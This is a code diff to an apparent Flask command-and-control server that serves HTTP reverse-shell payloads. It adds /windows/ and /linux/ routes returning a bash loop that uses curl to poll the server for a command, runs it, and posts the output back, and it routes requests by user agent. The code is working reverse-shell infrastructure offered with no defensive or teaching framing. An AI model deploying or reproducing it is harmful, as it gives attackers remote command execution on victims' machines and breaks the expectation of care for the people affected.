@@ -11,15 +11,30 @@ from flask import Flask, request
 app = Flask(__name__)
 
 
+@app.route('/', methods=['GET'])
+def get_home():
+    return '', 200
+
+
+@app.route('/windows/', methods=['GET'])
+def get_windows():
+    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+
+
+@app.route('/linux/', methods=['GET'])
+def get_linux():
+    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+
+
 @app.route('/http_reverse_shell/', methods=['GET'])
 def get_http_reverse_shell():
     if not request.args.get('ready'):
         if 'windows' in str(request.user_agent).lower():
-            return 'while :;do (c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)");sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+            return get_windows()
         elif 'linux' in str(request.user_agent).lower():
-            return 'while :;do (c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)");sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+            return get_linux()
         else:
-            return 'while :;do (c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)");sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+            return get_linux()
     with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'command.lock'), 'r+') as lock:
         command = lock.read().split('\n')[0]
         lock.seek(0)
